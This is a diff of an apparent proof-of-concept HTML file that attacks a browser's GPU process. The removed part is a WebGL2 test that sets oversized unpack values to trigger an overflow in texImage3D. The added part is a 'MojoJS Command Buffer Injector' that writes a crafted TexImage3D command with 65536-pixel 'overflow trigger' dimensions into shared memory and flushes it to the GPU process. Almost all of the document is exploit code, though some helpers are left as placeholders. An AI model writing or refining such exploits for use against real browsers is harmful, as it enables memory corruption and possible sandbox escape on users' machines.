@@ -1,44 +1,47 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>POC - PixelStorei Overflow (Fixed)</title>
-</head>
+<html>
 <body>
-  <h1>POC test 2 - Unpack State Overflow</h1>
-  <script>
-    const canvas = document.createElement('canvas');
-    const gl = canvas.getContext('webgl2');
-    
-    // FIX: We must create and bind a 3D texture first!
-    const tex = gl.createTexture();
-    gl.bindTexture(gl.TEXTURE_3D, tex);
-    
-    // Legal dimensions to pass Blink's MAX_3D_TEXTURE_SIZE check
-    const width = 1024; 
-    const height = 1024;
-    const depth = 2;
-    
-    // Manipulate the Unpack state. 
-    gl.pixelStorei(gl.UNPACK_ROW_LENGTH,   0x10000000); 
-    gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, 0x10000000); 
-    gl.pixelStorei(gl.UNPACK_SKIP_PIXELS,  0x08000000);
-    gl.pixelStorei(gl.UNPACK_SKIP_ROWS,    0x08000000);
+    <h1>MojoJS Command Buffer Injector</h1>
+    <script type="module">
+        // Import the pre-compiled bindings you downloaded
+        import { GpuChannelHost } from './gpu_channel.mojom.js';
+        
+        async function runExploit() {
+            if (typeof Mojo === "undefined") {
+                console.error("MojoJS not enabled!");
+                return;
+            }
 
-    // Create a tiny buffer
-    const tinyBuffer = new Uint8Array(16);
+            console.log("[*] Establishing Mojo GPU Channel...");
+            // The exact setup code depends on the repo you downloaded, but it usually looks like this:
+            let gpu_channel = await setup_gpu_channel(); 
+            let cmd_buffer = await gpu_channel.createCommandBuffer();
+            let shared_mem = cmd_buffer.getSharedMemory();
 
-    try {
-        // Send it to the GPU.
-        gl.texImage3D(
-            gl.TEXTURE_3D, 0, gl.RGBA8, 
-            width, height, depth, 0, 
-            gl.RGBA, gl.UNSIGNED_BYTE, tinyBuffer
-        );
-        console.log("No crash. Check adb logcat to see if the GPU process logged an error.");
-    } catch (e) {
-        console.error("Renderer caught it:", e);
-    }
-  </script>
+            console.log("[*] Crafting Malicious TexImage3D Command...");
+            
+            // This is the 44-byte structure for TexImage3D
+            const CMD_ID_TEXIMAGE3D = 0x00EB; // We may need to brute-force this ID
+            const SIZE_IN_WORDS = 11;
+            
+            let payload = new Uint32Array(shared_mem.buffer);
+            payload[0] = (SIZE_IN_WORDS << 11) | CMD_ID_TEXIMAGE3D; 
+            payload[1] = 0x806F;     // GL_TEXTURE_3D
+            payload[2] = 0;          // level
+            payload[3] = 0x8058;     // GL_RGBA8
+            payload[4] = 0x00010000; // width: 65536 (OVERFLOW TRIGGER)
+            payload[5] = 0x00010000; // height: 65536 (OVERFLOW TRIGGER)
+            payload[6] = 1;          // depth
+            payload[7] = 0x1908;     // format: GL_RGBA
+            payload[8] = 0x1401;     // type: GL_UNSIGNED_BYTE
+            payload[9] = 0;          // shm_id 
+            payload[10] = 100;       // shm_offset 
+
+            console.log("[*] Flushing Command Buffer to GPU Process...");
+            cmd_buffer.flush(SIZE_IN_WORDS);
+        }
+        
+        runExploit();
+    </script>
 </body>
 </html>
